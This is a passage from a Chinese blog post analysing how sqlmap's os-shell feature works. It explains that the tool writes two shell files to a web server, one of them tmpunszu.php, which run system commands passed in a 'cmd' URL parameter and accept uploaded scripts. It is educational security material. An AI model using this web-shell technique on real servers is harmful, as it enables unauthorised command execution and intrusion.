+<p>上述代码实现了 os-shell 得到命令后如何执行，以及输出执行结果到 os-shell 中。我们可以直接通过该文件在网站URL里面往 cmd 传参，执行系统命令。<br><img src="https://img-blog.csdnimg.cn/080187e99012405fb6ee45e087576478.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>我们来访问一下 tmpunszu.php页面<br><img src="https://img-blog.csdnimg.cn/2249a500ea6a47a899771a689aadd241.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>上传一个php探针文件并访问<br><img src="https://img-blog.csdnimg.cn/7843b166430e4a79885fb55011ca6611.png"><br>访问成功。</p>
+<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>通过上述的分析，我们知道了sqlmap os-shell参数的用法以及原理，通过往服务器上写入了两个shell文件，实现了执行系统命令和上传脚本文件的功能。🆗，本次分析到此结束。</p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xiaoming0/p/13951894.html">https://www.cnblogs.com/Xiaoming0/p/13951894.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/p/5505110.html">https://www.cnblogs.com/lcamry/p/5505110.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13951047.html">https://www.cnblogs.com/zzjdbk/p/13951047.html</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2058751973@qq.com </span>
